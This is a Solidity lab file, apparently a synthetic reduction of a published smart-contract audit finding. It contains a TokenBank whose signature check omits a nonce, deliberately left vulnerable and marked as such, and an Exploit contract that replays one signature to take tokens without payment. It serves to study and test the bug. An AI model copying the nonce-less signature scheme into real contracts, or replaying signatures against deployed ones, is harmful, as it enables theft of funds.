// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Remora Dynamic Tokens — TokenBank buyTokenOCP signature has no nonce
    (Cyfrin 2025-10-22, finding #63777, reporter 0xStalin)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: verifySignature hashes only (investor, token, amount) with no
    nonce / used-digest tracking. A single off-chain-payment signature can be
    replayed indefinitely to mint free tokens via buyTokenOCP.

    Vulnerable hash construction preserved with @> VULN marker.
//////////////////////////////////////////////////////////////////////////*/

interface IAllowlist {
    function isSigner(address signer) external view returns (bool);
}

contract MockCentralToken {
    string public constant name = "Central";
    string public constant symbol = "CTR";
    uint8 public constant decimals = 0;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract SimpleAllowlist {
    mapping(address => bool) public signers;

    function addSigner(address s) external {
        signers[s] = true;
    }

    function isSigner(address signer) external view returns (bool) {
        return signers[signer];
    }
}

/// @dev Reduced TokenBank focusing on buyTokenOCP + verifySignature (no nonce).
contract TokenBank {
    bytes32 public constant BUY_TOKEN_TYPEHASH =
        keccak256("BuyToken(address investor, address token, uint256 amount)");

    address public allowlist;
    MockCentralToken public immutable central;
    address public constant TOKEN_PLACEHOLDER = address(0xC2017A1);
    mapping(address => uint256) public purchased;
    // NOTE: no mapping(bytes32 => bool) usedDigests — that is the bug.

    error InvalidSignature();
    error InsufficientInventory();

    constructor(MockCentralToken central_, address allowlist_) {
        central = central_;
        allowlist = allowlist_;
    }

    function buyTokenOCP(
        address signer,
        address investor,
        address tokenAddress,
        uint256 amount,
        bytes memory signature
    ) external {
        if (!verifySignature(signer, investor, tokenAddress, amount, signature)) {
            revert InvalidSignature();
        }
        // Off-chain payment path: no stablecoin transfer
        _buyToken(investor, tokenAddress, amount);
    }

    function verifySignature(
        address signer,
        address investor,
        address token,
        uint256 amount,
        bytes memory signature
    ) internal view returns (bool result) {
        if (allowlist == address(0) || !IAllowlist(allowlist).isSigner(signer)) {
            return false;
        }
        // @audit-issue => No nonce on the hash of the signature
        // FIX: include a per-investor nonce (and bump it) or store used digests
        // @> VULN marked on the hash line: digest omits nonce / is never marked used
        bytes32 structHash = keccak256(abi.encode(BUY_TOKEN_TYPEHASH, investor, token, amount)); // @> VULN: no nonce

        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", structHash));
        result = _recover(digest, signature) == signer;
    }

    function _buyToken(address investor, address tokenAddress, uint256 amount) internal {
        require(tokenAddress == TOKEN_PLACEHOLDER, "token");
        if (central.balanceOf(address(this)) < amount) revert InsufficientInventory();
        central.transfer(investor, amount);
        purchased[investor] += amount;
    }

    function _recover(bytes32 ethSigned, bytes memory signature) internal pure returns (address) {
        require(signature.length == 65, "bad sig");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        return ecrecover(ethSigned, v, r, s);
    }
}

contract Exploit {
    MockCentralToken public central; // CREATE nonce 1
    SimpleAllowlist public allow; // CREATE nonce 2
    TokenBank public bank; // CREATE nonce 3

    address public constant INVESTOR = address(0xBEEF);
    address public constant TOKEN_PLACEHOLDER = address(0xC2017A1);
    uint256 public constant TOKENS_PER_BUY = 1;
    uint256 public constant REPLAY_COUNT = 5;

    // Precomputed offline: private key 0xA11CE
    // signs eth_sign(keccak256(BUY, INVESTOR, TOKEN_PLACEHOLDER, 1))
    address public constant SIGNER = 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7;
    bytes32 public constant R = 0x296e28ff2e0e8e520424aef1a2ce1e30946713f102f2268efcb40eb963784a8b;
    bytes32 public constant S = 0x38310ab4bbdc431352c6a679a496703c56da4095cf7359e2bbe39e98707d2a48;
    uint8 public constant V = 28;

    constructor() {
        central = new MockCentralToken();
        allow = new SimpleAllowlist();
        bank = new TokenBank(central, address(allow));
        allow.addSigner(SIGNER);
        // Seed enough inventory for the replay attack
        central.mint(address(bank), REPLAY_COUNT);
    }

    function run() external {
        bytes memory sig = abi.encodePacked(R, S, V);

        // Replay the SAME signature REPLAY_COUNT times — no nonce to stop us
        for (uint256 i = 0; i < REPLAY_COUNT; i++) {
            bank.buyTokenOCP(SIGNER, INVESTOR, TOKEN_PLACEHOLDER, TOKENS_PER_BUY, sig);
        }

        // HARM: one signature bought REPLAY_COUNT tokens (would be infinite with more inventory)
        require(central.balanceOf(INVESTOR) == REPLAY_COUNT, "replay did not mint free tokens");
        require(bank.purchased(INVESTOR) == REPLAY_COUNT, "purchased mismatch");
        require(central.balanceOf(address(bank)) == 0, "inventory remains");
    }
}
